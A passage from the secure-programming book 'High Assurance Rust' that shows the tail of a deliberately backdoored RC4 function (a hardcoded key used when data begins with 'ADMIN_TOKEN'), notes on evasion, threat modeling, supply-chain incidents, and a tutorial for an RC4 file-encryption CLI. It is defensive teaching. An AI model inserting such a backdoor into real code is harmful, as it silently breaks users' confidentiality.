        rc4.apply_keystream(data);
    }

    // ..prga_next() definition omitted..
}</code></pre>
<p>Notice the additional bit of malicious logic in <code>apply_keystream_static</code>: if the data to be encrypted starts with the text <code>ADMIN_TOKEN</code>, the function ignores the provided key and uses a hardcoded one!</p>
<p>Given prior knowledge of the hardcoded key, a <strong>passive</strong> network attacker may decrypt sensitive data in real-time, compromising the confidentiality of any system using the backdoored library.
An <strong>active</strong> network attacker might intercept the token and leverage it for lateral movement to new internal systems.</p>
<p>Worse yet, if we run <code>cargo test</code> all tests will pass.
Even if we had invested time in porting every single table/vector in the IETF document<sup class="footnote-reference" id="fr-TestVec-1"><a href="#footnote-TestVec">10</a></sup>, our dynamic test suite would still fail to detect this backdoor.</p>
<p>The problem is that the malicious branch, the first block of the inserted <code>if</code>, is only taken when <code>ADMIN_TOKEN</code> appears at the start of the data.
That's a single execution path we're incredibly unlikely to hit - we wouldn't know to test for an arbitrary and obscure condition like this one.
And if our build system was compromised, an implant probably wouldn't backdoor code for test builds anyway.</p>
<blockquote>
<p><strong>How "unlikely"?</strong></p>
<p>Say we add a supplemental test to our RC4 library that uses randomness.
It verifies that, if we encrypt a random message with a random key, later decrypting with the <em>same key</em> produces the <em>original message</em>.</p>
<p><code>ADMIN_TOKEN</code> is a 11 character string.
With an alphabet restricted to only upper and lowercase characters (no digits/symbols, etc), there are <code>52^11</code> possible 11 character strings.
The chance of hitting <code>ADMIN_TOKEN</code> at random is only 1 in 7 <em>quintillion</em>.
Basically zero.
And that search space is too large to test exhaustively.</p>
</blockquote>
<p>This demonstrates the achilles heel of dynamic analysis: any single execution is only a tiny sample of a program's state space.
We can test for the presence of specific bugs, should we have the foresight to write a relevant test case, but can never prove the absence of bugs.
Or backdoors.</p>
<blockquote>
<p><strong>Practical Backdoors and Evasion</strong></p>
<p>Our backdoor could be detected statically.
We branch, on a comparison to a specific constant, to overwrite a provided parameter.
It's possible to generate a "signature" for this pattern or something similar - even without access to source code.</p>
<p>While we could compensate via <em>packing</em> and <em>obfuscation</em> (techniques that make our code harder to analyze, both manually and automatically), that could backfire and make the backdoored program appear even more suspicious.</p>
<p>While this book isn't focused on offense, we should be generally aware of evasion tactics to be effective defenders.
For cryptographic code, that means subverting the <em>algorithm</em> in a subtle way that adversely affects its mathematical guarantees<sup class="footnote-reference" id="fr-DHBackdoor-1"><a href="#footnote-DHBackdoor">11</a></sup>.
Not inserting an <code>if</code> statement, like the above example (which doesn't even handle the decryption case).</p>
</blockquote>
<h2 id="situational-context-for-real-world-systems"><a class="header" href="#situational-context-for-real-world-systems">Situational Context for Real-world Systems</a></h2>
<p>Encryption alone does not guarantee <em>integrity</em> (that data hasn't been modified or corrupted) or <em>authenticity</em> (that data came from a trusted source).
And, again, the RC4 cipher is no longer considered secure.</p>
<p>For real-world use, we'd likely want a cipher that supports Authenticated Encryption with Associated Data (AEAD)<sup class="footnote-reference" id="fr-AEAD-1"><a href="#footnote-AEAD">12</a></sup>.
To validate both integrity and authenticity, while still protecting confidentiality.
The RustCrypto organization, a community effort, maintains a list of open-source, pure-Rust crates<sup class="footnote-reference" id="fr-AEADList-1"><a href="#footnote-AEADList">13</a></sup> that offer AEAD-compatible ciphers (both stream and block).</p>
<p>Remember how RC4 was once part of major protocols, like SSL/TLS and WEP?
In protocol design, even an AEAD cipher isn't enough to meet all security requirements.
Imagine a network attacker does the following:</p>
<ol>
<li>
<p>Listen to valid broadcast packets.</p>
</li>
<li>
<p>Store a copy of each packet received.</p>
</li>
<li>
<p>Retransmit stored packets to their original destination, perhaps later.</p>
</li>
</ol>
<p>That retransmission is called a <em>replay attack</em>.
The attacker never decrypts, modifies, or forges a packet - AEAD is never compromised.
Yet the results can be devastating:</p>
<ul>
<li>
<p>Say the attacker re-transmits aggressively.
The destination server could be overwhelmed with the packet volume.
If it's busy processing the attacker's copies, it may miss response deadlines for legitimate users. That means suffering service degradation, or even <em>Denial of Service (DoS)</em>.</p>
<ul>
<li>Example defense: per-client rate-limiting.</li>
</ul>
</li>
<li>
<p>Say the attacker only re-transmits once, but the message was to confirm a deposit and increase a user's account balance.
Maybe the attacker just doubled their money.</p>
<ul>
<li>Example defense: trusted timestamps in encrypted payload, only commit transactions with newer stamp than last commit (and handle possible wrap-around).</li>
</ul>
</li>
</ul>
<p>Cryptography is only one factor in the security of real world protocols and systems.
Encryption algorithms address only one [core] part of an overall threat model.</p>
<h2 id="the-big-picture-threat-modeling"><a class="header" href="#the-big-picture-threat-modeling">The Big Picture: Threat Modeling</a></h2>
<p>We've alluded to a "big picture" perspective, system design context beyond individual blocks of code, several times in this section.
High-level security design review involves a process called <strong>threat modeling</strong><sup class="footnote-reference" id="fr-OWASPThreat-1"><a href="#footnote-OWASPThreat">14</a></sup>.
Generally, the workflow is something like this:</p>
<ol>
<li>
<p>Identify assets (data or resources of value) within a system.</p>
</li>
<li>
<p>Review each asset's attack surface and enumerate the corresponding threats. Looking for sources of untrusted input can be a good way to start.</p>
</li>
<li>
<p>Rank the threats. One general way to prioritize is <code>risk = likelihood * severity</code>.</p>
</li>
<li>
<p>Implement controls and mitigations proportional to ranked threats.</p>
</li>
<li>
<p>Test the efficacy of mitigations and controls.</p>
</li>
</ol>
<p>Threat modeling is most valuable when done early in a product's lifecycle, like during architectural design (before code has been written).
The earlier we can catch and remediate issues, the cheaper and easier they are to fix (aka "shift left" security).</p>
<p>There exist several methodologies for threat modeling, and entire books covering them.
Though closer to a taxonomy than a full methodology, <strong>STRIDE</strong> is one popular and enduring approach.
It was adopted by Microsoft in 2002 and has evolved since.
The acronym is broken down as follows<sup class="footnote-reference" id="fr-SEIThreat-1"><a href="#footnote-SEIThreat">15</a></sup>:</p>
<div class="table-wrapper"><table><thead><tr><th>Letter</th><th>Threat</th><th>Threat Definition</th><th>Property Violated</th></tr></thead><tbody>
<tr><td><strong>S</strong></td><td><strong>Spoofing</strong></td><td>Pretending to be someone or something</td><td>Authentication</td></tr>
<tr><td><strong>T</strong></td><td><strong>Tampering</strong></td><td>Unauthorized modification or deletion of data</td><td>Integrity</td></tr>
<tr><td><strong>R</strong></td><td><strong>Repudiation</strong></td><td>Claiming that you didn't do something</td><td>Non-repudiation</td></tr>
<tr><td><strong>I</strong></td><td><strong>Information Disclosure</strong></td><td>Exposing sensitive information to an unauthorized party</td><td>Confidentiality</td></tr>
<tr><td><strong>D</strong></td><td><strong>Denial of Service</strong></td><td>Exhausting resources needed to provide a service</td><td>Availability</td></tr>
<tr><td><strong>E</strong></td><td><strong>Elevation of Privilege</strong></td><td>Allowing an action to be performed by an unauthorized party</td><td>Authorization</td></tr>
</tbody></table>
</div>
<p>STRIDE is intentionally high-level.
It aims to be applicable to a broad range of products, systems, and services.
Hence the focus on generally desirable properties.</p>
<p>More granular threat enumeration frameworks can aid realistic threat model development.
<strong>MITRE ATT&amp;CK</strong> is a modern example, it self-describes as<sup class="footnote-reference" id="fr-MITREAttack-1"><a href="#footnote-MITREAttack">16</a></sup>:</p>
<blockquote>
<p>...a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. The ATT&amp;CK knowledge base is used as a foundation for the development of specific threat models and methodologies in the private sector, in government, and in the cybersecurity product and service community.</p>
</blockquote>
<p>Whereas limited aspects of code analysis <em>may</em> be supplemented with tools (e.g. the Rust compiler proving memory safety), automating threat modeling would require general artificial intelligence.
In other words, it's a task for which you should budget person hours - early and up front.</p>
<h2 id="takeaway-3"><a class="header" href="#takeaway-3">Takeaway</a></h2>
<p>Powerful as they are, type systems can't model most bug classes.
Rust doesn't solve the majority of real-world security problems.
Manual analysis, meaning code review and threat modeling, is a necessity.</p>
<p>Sitting in between the compiler's type checks and manual review is a form of semi-automated validation: dynamic analysis.
This usually takes the form of unit tests, run after building the code but before asking peers to review it.</p>
<p>While these tests help bolster confidence and can catch serious issues, they <em>cannot</em> prove the <em>absence</em> of bugs or back doors.
For real-world programs (not the naive backdoor above), this is true even if the test suite achieves 100% code coverage - meaning every branch of the program is taken at least once.</p>
<p>Why? Because the state space of a complex application is not solely a function of branches taken, it also depends on the value of pieces of data (among other factors).
And as we saw in the 11 character permutation example, we can't exhaustively test every possible value for even a tiny piece of data.</p>
<p>More generally, no automated tooling will ever be able to reliably determine if a program is malicious.
Or if a benign program is secure.
Making that determination is provably impossible (Rice's Theorem<sup class="footnote-reference" id="fr-RiceTheorem-1"><a href="#footnote-RiceTheorem">17</a></sup>).</p>
<p>Systems we <em>consider</em> secure are typically those that have stood the test of time.
Like well-studied protocols or heavily audited open-source projects.
But a new vulnerability is always a possibility.</p>
<p>Remember: there is <em>no absolute</em> security.
Only levels of <em>assurance</em>.</p>
<p>With all of this context out of the way, let's return to our RC4 library and leverage it for something useful: encrypting local files via a command line interface.</p>
<blockquote>
<p><strong>Supply Chain Attacks are a Serious Problem</strong></p>
<p>Software supply chain attacks aren't relegated exclusively to targeted espionage, like the aforementioned SolarWinds case.
Any software project that relies on 3rd party dependencies should be wary of backdoored or otherwise malicious packages as a potential threat vector.
Consider two recent examples:</p>
<ul>
<li>
<p>In April of 2022, authors of the popular  <code>npm</code> package <code>node-ipc</code> intentionally inserted malware to protest Russia's invasion of Ukraine. The malicious code attempted to identify hosts in Russia and Belarus based on IP geo-location, and replace the contents of all on-disk files if location matches<sup class="footnote-reference" id="fr-NodeIPCMalware-1"><a href="#footnote-NodeIPCMalware">18</a></sup> (data loss).</p>
</li>
<li>
<p>In May of 2022, a malicious Rust crate, named <code>rustdecimal</code>, was reported. The name is a "typosquatting attack" targeting users of the benign <code>rust_decimal</code> crate. On call to a specific function, the malicious crate would download an executable payload if a CI-related environment variable was set. The payload's logic is unknown, the download URL was inactive by the time the issue was discovered<sup class="footnote-reference" id="fr-RustdecimalMalware-1"><a href="#footnote-RustdecimalMalware">19</a></sup>.</p>
</li>
</ul>
<p>Tools like <code>cargo-crev</code><sup class="footnote-reference" id="fr-CargoCrev-1"><a href="#footnote-CargoCrev">20</a></sup> and <code>cargo-supply-chain</code><sup class="footnote-reference" id="fr-CargoSupplyChain-1"><a href="#footnote-CargoSupplyChain">21</a></sup> can aid evaluation of a Rust project's dependencies and their authorship.
But no technical control will prevent all supply chain attacks.
Mature organizations may mitigate risk by adopting processes and policies for dependency vetting and maintenance.</p>
</blockquote>
<hr>
<ol class="footnote-definition"><li id="footnote-IFC">
<p><a href="https://kilthub.cmu.edu/articles/report/Compositional_Information_Flow_Monitoring_for_Reactive_Programs/19214415"><em>Compositional Information Flow Monitoring for Reactive Programs</em></a>. McKenna McCall, Abhishek Bichhawat, Limin Jia (2022). Information Flow Control (IFC), this paper's field, explores ways to address sensitive information leakage. Though formal, the problems tackled by this work - namely its titular support for event-driven programs and composition of heterogenous components - are representative of real-world systems. Information leakage might eventually be a problem we can solve in a systematic and principled fashion. <a href="#fr-IFC-1">↩</a></p>
</li>
<li id="footnote-TypeState">
<p>Although the "type state" pattern (in general, not unique to Rust) can help a bit. And "Session types"<sup class="footnote-reference" id="fr-SessionTypes-1"><a href="#footnote-SessionTypes">22</a></sup> are particularly useful for message-passing protocols. <a href="#fr-TypeState-1">↩</a></p>
</li>
<li id="footnote-DirtyPipe">
<p><a href="https://dirtypipe.cm4all.com/"><em>The Dirty Pipe Vulnerability</em></a>. Max Kellerman (2022). <a href="#fr-DirtyPipe-1">↩</a></p>
</li>
<li id="footnote-HexType">
<p><a href="https://dl.acm.org/doi/pdf/10.1145/3133956.3134062"><em>HexType: Efficient Detection of Type Confusion Errors for C++</em></a>. Yuseok Jeon, Priyam Biswas, Scott Carr, Byoungyoung Lee, and Mathias Payer (2017). <a href="#fr-HexType-1">↩</a></p>
</li>
<li id="footnote-RustTypes">
<p>In Rust, certain primitive types can be converted with the <code>as</code> keyword. Integers of different sizes are one example. Conversions between user-defined types use "traits" (interfaces for shared behavior we'll cover in chapter 3). Specifically <code>From</code><sup class="footnote-reference" id="fr-TraitFrom-1"><a href="#footnote-TraitFrom">23</a></sup> and <code>Into</code><sup class="footnote-reference" id="fr-TraitInto-1"><a href="#footnote-TraitInto">24</a></sup>. These safely cover the majority of type casting use cases. If a Rust programmer <em>really</em> needs to arbitrarily re-interpret a sequence of bits, the <code>unsafe</code> function <code>std::mem::transmute</code><sup class="footnote-reference" id="fr-FuncTransmut-1"><a href="#footnote-FuncTransmut">25</a></sup> is a last resort. <a href="#fr-RustTypes-1">↩</a></p>
</li>
<li id="footnote-CWETop25">
<p><a href="https://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html"><em>CWE Top 25 Most Dangerous Software Weaknesses</em></a>. The MITRE Corporation (2021). <a href="#fr-CWETop25-1">↩</a> <a href="#fr-CWETop25-2">↩2</a> <a href="#fr-CWETop25-3">↩3</a></p>
</li>
<li id="footnote-OWASP">
<p><a href="https://owasp.org/www-project-top-ten/"><em>Top 10 Web Application Security Risks</em></a>. OWASP (2021). <a href="#fr-OWASP-1">↩</a></p>
</li>
<li id="footnote-Covid19">
<p><a href="https://www.yalemedicine.org/news/covid-timeline"><em>Our Pandemic Year—A COVID-19 Timeline</em></a>. Kathy Katella (2021). <a href="#fr-Covid19-1">↩</a></p>
</li>
<li id="footnote-SolarWinds">
<p><a href="https://whatis.techtarget.com/feature/SolarWinds-hack-explained-Everything-you-need-to-know"><em>SolarWinds hack explained: Everything you need to know</em></a>. Saheed Oladimeji, Sean Michael Kerner (2021). <a href="#fr-SolarWinds-1">↩</a></p>
</li>
<li id="footnote-TestVec">
<p><a href="https://datatracker.ietf.org/doc/html/rfc6229"><em>Test Vectors for the Stream Cipher RC4</em></a>. Internet Engineering Task Force (2011). <a href="#fr-TestVec-1">↩</a></p>
</li>
<li id="footnote-DHBackdoor">
<p><a href="https://eprint.iacr.org/2016/644.pdf"><em>How to Backdoor Diffie-Hellman</em></a>. David Wong (2016). <a href="#fr-DHBackdoor-1">↩</a></p>
</li>
<li id="footnote-AEAD">
<p><a href="https://en.wikipedia.org/wiki/Authenticated_encryption"><em>Authenticated encryption</em></a>. Wikipedia (Accessed 2022). <a href="#fr-AEAD-1">↩</a></p>
</li>
<li id="footnote-AEADList">
<p><a href="https://github.com/RustCrypto/AEADs"><em>RustCrypto: Authenticated Encryption with Associated Data (AEAD) Algorithms</em></a>. RustCrypto organization (Accessed 2022). <a href="#fr-AEADList-1">↩</a></p>
</li>
<li id="footnote-OWASPThreat">
<p><a href="https://insights.sei.cmu.edu/blog/threat-modeling-12-available-methods/">Threat Modeling Cheat Sheet</a>. OWASP (2021). <a href="#fr-OWASPThreat-1">↩</a></p>
</li>
<li id="footnote-SEIThreat">
<p><a href="https://insights.sei.cmu.edu/blog/threat-modeling-12-available-methods/">Threat Modeling: 12 Available Methods </a>. CMU SEI (2018). <a href="#fr-SEIThreat-1">↩</a></p>
</li>
<li id="footnote-MITREAttack">
<p><a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a>. MITRE (Accessed 2022). <a href="#fr-MITREAttack-1">↩</a></p>
</li>
<li id="footnote-RiceTheorem">
<p><a href="https://en.wikipedia.org/wiki/Rice%27s_theorem"><em>Rice's theorem</em></a>. Wikipedia (Accessed 2022). <a href="#fr-RiceTheorem-1">↩</a></p>
</li>
<li id="footnote-NodeIPCMalware">
<p><a href="https://github.com/advisories/GHSA-97m3-w2cp-4xx6"><em>Embedded Malicious Code in <code>node-ipc</code></em></a>. GitHub (2022). <a href="#fr-NodeIPCMalware-1">↩</a></p>
</li>
<li id="footnote-RustdecimalMalware">
<p><a href="https://blog.rust-lang.org/2022/05/10/malicious-crate-rustdecimal.html"><em>Security advisory: malicious crate rustdecimal</em></a>. The Rust Team (2022). <a href="#fr-RustdecimalMalware-1">↩</a></p>
</li>
<li id="footnote-CargoCrev">
<p><a href="https://github.com/crev-dev/cargo-crev"><em><code>cargo-crev</code></em></a>. <code>cargo-crev</code> Contributors (Accessed 2022). <a href="#fr-CargoCrev-1">↩</a></p>
</li>
<li id="footnote-CargoSupplyChain">
<p><a href="https://github.com/rust-secure-code/cargo-supply-chain"><em><code>cargo-supply-chain</code></em></a>. Rust Secure Code Working Group (Accessed 2022). <a href="#fr-CargoSupplyChain-1">↩</a></p>
</li>
<li id="footnote-SessionTypes">
<p><a href="https://wen.works/2020/12/17/an-introduction-to-session-types/"><em>An Introduction to Session Types</em></a>. Wen Kokke (2020). <a href="#fr-SessionTypes-1">↩</a></p>
</li>
<li id="footnote-TraitFrom">
<p><a href="https://doc.rust-lang.org/std/convert/trait.From.html"><em>Trait <code>std::convert::From</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitFrom-1">↩</a></p>
</li>
<li id="footnote-TraitInto">
<p><a href="https://doc.rust-lang.org/std/convert/trait.Into.html"><em>Trait <code>std::convert::Into</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitInto-1">↩</a></p>
</li>
<li id="footnote-FuncTransmut">
<p><a href="https://doc.rust-lang.org/std/mem/fn.transmute.html"><em>Function <code>std::mem::transmute</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-FuncTransmut-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="diy-cli-encryption-tool"><a class="header" href="#diy-cli-encryption-tool">DIY CLI Encryption Tool</a></h1>
<p>Unit tests demonstrated that our library is correct (at least the first, non-backdoored version).
We'll now use it to build a Command Line Interface (CLI) encryption utility!</p>
<p>Our tool will accept two arguments, a filename and a hexadecimal encryption key, and proceed to encrypt or decrypt the file on disk.</p>
<p>Given the simplicity of those requirements, we could easily build our CLI tool using only Rust's standard library:</p>
<ul>
<li>
<p>The <code>std::env</code> module<sup class="footnote-reference" id="fr-StdEnv-1"><a href="#footnote-StdEnv">1</a></sup> provides OS-agnostic argument access (not quite parsing), among other facilities.</p>
</li>
<li>
<p>The <code>std::fs</code> module<sup class="footnote-reference" id="fr-StdFs-1"><a href="#footnote-StdFs">2</a></sup> provides OS-agnostic filesystem input/output (e.g. reading/writing files).</p>
</li>
</ul>
<p>Using strictly <code>std</code> would be a fine way to proceed.
If you're a purist, or you'd like to work through a problem without guidance, you can try adapting the below program to use only the standard library.
But we're going to try out Rust's 3rd-party library ecosystem.</p>
<p>Real-world command line applications make use of various 3rd party libraries.
Rust's CLI ecosystem offers plug-n-play (easy to build and link) argument parsing<sup class="footnote-reference" id="fr-Clap-1"><a href="#footnote-Clap">3</a></sup>, text coloring<sup class="footnote-reference" id="fr-Owo-1"><a href="#footnote-Owo">4</a></sup>, integration testing<sup class="footnote-reference" id="fr-AssertCmd-1"><a href="#footnote-AssertCmd">5</a></sup>, Text-based User Interfaces (TUIs)<sup class="footnote-reference" id="fr-Tui-1"><a href="#footnote-Tui">6</a></sup>, etc.
A vast sea of community-maintained libraries make building and maintaining CLI apps a joy.</p>
<p>So let's go ahead and try out a popular library: we'll use the <code>clap</code> crate<sup class="footnote-reference" id="fr-Clap-2"><a href="#footnote-Clap">3</a></sup> for argument parsing.
<code>clap</code> uses Rust's macro system to enable declarative argument parsing logic, as we'll soon see.</p>
<blockquote>
<p><strong>Leveraging the growing Rust ecosystem</strong></p>
<p>One of Rust's killer features is <code>cargo</code>, its official package manager and build system.
We already used <code>cargo</code> to compile and test our RC4 library.
But <code>cargo</code>'s true value is how easy it makes leveraging libraries from the broader Rust ecosystem.</p>
<p>In modern development, the practicality of a programming language is a function of both core language features <em>and</em> the availability of domain-specific abstractions developed/maintained by someone else - in the form of libraries (called "crates" in Rust).</p>
<p>Software engineers need to ship quality code quickly.
That means using existing code, when appropriate, to bootstrap our products.
At the time of this writing, <a href="https://crates.io/">crates.io</a>, the official centralized repository for Rust libraries, hosts over 75,000 crates.</p>
<p>Of course, not every crate is well-maintained, production quality, or secure.
But we have many options from which to choose.
And that number will continue to grow as the Rust ecosystem matures.</p>
</blockquote>
<p><code>cargo</code> will take care of downloading and building the latest version of <code>clap</code>.
All we need to do is add one line to <code>crypto_tool/rcli/Cargo.toml</code>:</p>
<pre><code class="language-toml ignore">[package]
name = "rcli"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
rc4 = { path = "../rc4" }
clap = { version = "^4", features = ["derive"] }
</code></pre>
<ul>
<li>
<p><code>features = ["derive"]</code> enables an optional feature of the <code>clap</code> library: support for derive macros. It'll save us some boilerplate.</p>
</li>
<li>
<p><code>version = "^4"</code> tells <code>cargo</code> that our tool uses the latest <code>clap</code> version <code>&gt;= 4.0.0</code> but <code>&lt; 5.0.0</code>. We can assume API stability for <code>4.x.x</code> versions because Rust crates follow <em>semantic versioning</em> (semver, e.g. <code>MAJOR.MINOR.PATCH</code>)<sup class="footnote-reference" id="fr-SemVer-1"><a href="#footnote-SemVer">7</a></sup>.</p>
</li>
</ul>
<p>Notice that, unlike the <code>rc4</code> dependency, we don't provide a local <code>path</code> for <code>clap</code>.
<code>cargo</code> will download the source code from <a href="https://crates.io/">crates.io</a> the first time we build or run our <code>rcli</code> project.</p>
<blockquote>
<p><strong>Can 3rd-party code be trusted?</strong></p>
<p>Most software leverages 3rd-party code.
But each external component we pull in risks introducing bugs and/or vulnerabilities into our system.
For this reason, mature organizations have processes in place to vet dependencies and suppliers.</p>
<p>In some contexts, it's safer to audit the source of a 3rd-party dependency and only use the pre-audited version for all our builds.
The setup of internal repositories and build systems is specific to individual companies and teams.</p>
<p>Note that, for certain problem classes, 3rd-party code actually <em>reduces</em> risk.
Cryptography is a classic example: we're likely better off pulling in a mature library than writing our own implementation of the same algorithm(s).</p>
<p>While manual argument parsing isn't as risky in Rust as it is in C, using <code>clap</code> still reduces chance of error.</p>
</blockquote>
<h2 id="parsing-arguments-with-clap"><a class="header" href="#parsing-arguments-with-clap">Parsing Arguments with <code>clap</code></a></h2>
<p>One of <code>clap</code>'s most convenient features is the ability to <em>annotate</em> the fields of a structure.
Each annotation, which is mechanically a Rust macro, generates code to take care of displaying and parsing arguments.</p>
<ul>
<li>
<p>When a user invokes our CLI tool, we get a single structure with their requested settings/operations (<code>Args</code> in the below).</p>
</li>
<li>
<p>Instead of worrying about the intricacies of argument parsing, we can focus effort on our "business logic": actioning the fields of the structure to perform the requested tasks.</p>
</li>
</ul>
<p>Let's see how this plays out.
Add the below to <code>crypto_tool/rcli/src/main.rs</code>:</p>
<pre><code class="language-rust ignore">use clap::Parser;

/// RC4 file en/decryption
#[derive(Parser, Debug)]
struct Args {
    /// Name of file to en/decrypt
    #[arg(short, long, required = true, value_name = "FILE_NAME")]
    file: String,

    /// En/Decryption key (hexadecimal bytes)
    #[arg(
        short,
        long,
        required = true,
        value_name = "HEX_BYTE",
        num_args = 5..=256,
    )]
    key: Vec&lt;String&gt;,
}

fn main() {
    let args = Args::parse();
    println!("{:?}", args);
}</code></pre>
<ul>
<li>
<p><code>Args</code> is a <code>struct</code> with 2 fields:</p>
<ul>
<li>
<p><code>file</code>, a string that will contain the path/name of the file to be en/decrypted.</p>
</li>
<li>
<p><code>key</code>, a dynamic array of individual, space-separated strings. Each string will be a hexadecimal byte of the key.</p>
</li>
</ul>
</li>
<li>
<p>Highlights from <code>clap</code>'s field annotations (macros of the form <code>#[something(...)]</code>):</p>
<ul>
<li>
<p><code>short</code> - generate a short argument name (e.g. <code>-f</code> for <code>file</code>).</p>
</li>
<li>
<p><code>long</code> - generate a long argument name (e.g. <code>--file</code> for <code>file</code>).</p>
</li>
<li>
<p><code>required = true</code> - argument <em>must</em> be provided to run the tool.</p>
</li>
<li>
<p><code>num_args = 5..=256</code> - enforces RC4's minimum 5 byte (40 bit) and maximum 256 byte (2048 bit) key length.</p>
</li>
</ul>
</li>
</ul>
<p>Our two-line <code>main</code> function currently just prints out the <code>Args</code> structure collected from user input.
The format specifier <code>{:?}</code> allows us to use a default formatter, which <code>Args</code> supports because it derives the <code>Debug</code> trait.
We'll talk about traits in the next chapter.</p>
<blockquote>
<p><strong>How would I learn about the annotations <code>clap</code> supports?</strong></p>
<p>Rust has a built-in documentation system, <code>rustdoc</code><sup class="footnote-reference" id="fr-RustDoc-1"><a href="#footnote-RustDoc">8</a></sup>.
All public crates provided generated documentation, but its completeness varies by project.
You can view <code>clap</code>'s docs at <a href="https://docs.rs/clap">https://docs.rs/clap</a>.</p>
</blockquote>
<p>To run our work-in-progress CLI tool, as is, we can use the command <code>cargo run -- --help</code>:</p>
<pre><code class="language-ignore">RC4 file en/decryption

Usage: rcli --file &lt;FILE_NAME&gt; --key &lt;HEX_BYTE&gt; &lt;HEX_BYTE&gt; &lt;HEX_BYTE&gt; &lt;HEX_BYTE&gt; &lt;HEX_BYTE&gt;...

Options:
  -f, --file &lt;FILE_NAME&gt;
          Name of file to en/decrypt
  -k, --key &lt;HEX_BYTE&gt; &lt;HEX_BYTE&gt; &lt;HEX_BYTE&gt; &lt;HEX_BYTE&gt; &lt;HEX_BYTE&gt;...
          En/Decryption key (hexadecimal bytes)
  -h, --help
          Print help
</code></pre>
<p>The <code>--</code> delimiter tells <code>cargo</code> to pass the remainder of the input to our CLI tool.
In this case we're only passing the flag <code>--help</code>.
Conveniently, <code>clap</code> implemented this flag for us.
Since it's a common convention for CLI tools.
Note how the comments (lines starting with <code>///</code>) for each field of the <code>Args</code> struct are used as descriptions in the help output.</p>
<p>But <code>--help</code> doesn't run our <code>main</code> function.
Let's try <code>cargo run -- --file test.txt --key 0x01 0x02 0x03 0x04 0x05</code> to simulate regular usage of our tool.
With the minimum five byte key length.
Our <code>main</code> will print:</p>
<pre><code class="language-ignore">Args { file: "test.txt", key: ["0x01", "0x02", "0x03", "0x04", "0x05"] }
</code></pre>
<p>We have working argument parsing!</p>
<h2 id="implementing-the-file-endecryption-logic"><a class="header" href="#implementing-the-file-endecryption-logic">Implementing the File En/Decryption Logic</a></h2>
<p>All that's left is the "glue" between our RC4 library and our new CLI front-end.
Let's update <code>main</code> to (note the additional imports at the top):</p>
<pre><code class="language-rust ignore">use clap::Parser;
use rc4::Rc4;
use std::fs::File;
use std::io::prelude::{Read, Seek, Write};

// `Args` struct omitted, unchanged...

fn main() -&gt; std::io::Result&lt;()&gt; {
    let args = Args::parse();
    let mut contents = Vec::new();

    // Convert key strings to byte array
    let key_bytes = args
        .key
        .iter()
        .map(|s| s.trim_start_matches("0x"))
        .map(|s| u8::from_str_radix(s, 16).expect("Invalid key hex byte!"))
        .collect::&lt;Vec&lt;u8&gt;&gt;();

    // Validation note:
    // `Args` enforces (5 &lt;= key_bytes.len() &amp;&amp; key_bytes.len() &lt;= 256)

    // Open the file for both reading and writing
    let mut file = File::options().read(true).write(true).open(&amp;args.file)?;

    // Read all file contents into memory
    file.read_to_end(&amp;mut contents)?;

    // En/decrypt file contents in-memory
    Rc4::apply_keystream_static(&amp;key_bytes, &amp;mut contents);

    // Overwrite existing file with the result
    file.rewind()?; // "Seek" to start of file stream
    file.write_all(&amp;contents)?;

    // Print success message
    println!("Processed {}", args.file);

    // Return success
    Ok(())
}</code></pre>
<p>We've added a return type for <code>main</code>: <code>std::io::Result&lt;()&gt;</code><sup class="footnote-reference" id="fr-IORes-1"><a href="#footnote-IORes">9</a></sup>.
We'll cover Rust's <code>Result</code> type in the next chapter.
The important part here is that all <em>fallible</em> file I/O operations within <code>main</code>'s body end with the <code>?</code> operator.
This tells the function to "short-circuit" if an operation fails and immediately return the error <code>Result</code>.</p>
<p>For example, say someone runs our program and provides a path to a non-existent file:</p>
<pre><code class="language-ignore">cargo run -- --file non_existant_file.txt --key 0x01 0x02 0x03 0x04 0x05
</code></pre>
<p>The line <code>let mut file = File::open(args.file)?;</code> will fail and terminate the program with the following error:</p>
<pre><code class="language-ignore">Error: Os { code: 2, kind: NotFound, message: "No such file or directory" }
</code></pre>
<p>In a production-grade tool, we could handle errors gracefully, log them, or wrap them with more user-friendly output.
If no errors are hit, we simply return an empty value (<code>()</code>, Rust's <em>unit type</em><sup class="footnote-reference" id="fr-Unit-1"><a href="#footnote-Unit">10</a></sup>) wrapped in <code>Ok</code> to indicate success.</p>
<p>Our new <code>main</code> function has a few more pieces worth explaining:</p>
<ul>
<li>
<p><strong>No buffering:</strong> We read the whole file into memory at once, into the byte vector <code>contents</code>. Supporting large files could be made more efficient with a technique called <em>buffering</em>, where we only read/encrypt a small chunk at a time. This example aims for simplicity instead.</p>
</li>
<li>
<p><strong>Optional byte prefix:</strong> The key conversion logic uses Rust's functional-style iterators. We'll discuss iterators at length later. Note that <code>s.trim_start_matches("0x")</code> allows our user to <em>optionally</em> add the prefix <code>0x</code> to each byte. Meaning <code>--key 01 02 03 04 05</code> would have been valid and equivalent input.</p>
</li>
<li>
<p><strong>Input validation:</strong> Whenever you write code that parses input you don't control, that input is <em>untrusted</em>. It may be <em>attacker-controlled</em>. Validate it ASAP - before passing it along to any other component of your program or system. Our <code>main</code> uses a three step-validation:</p>
<ol>
<li>
<p><strong>Valid key length:</strong> Instead of assuming our encryption library checks key length (which our RC4 implementation does!), we used an annotation on the <code>key</code> field in <code>Arg</code> (e.g. <code>num_args = 5..=256</code>). Try <code>cargo run -- -f anything.txt -k 01</code> to see the error.</p>
</li>
<li>
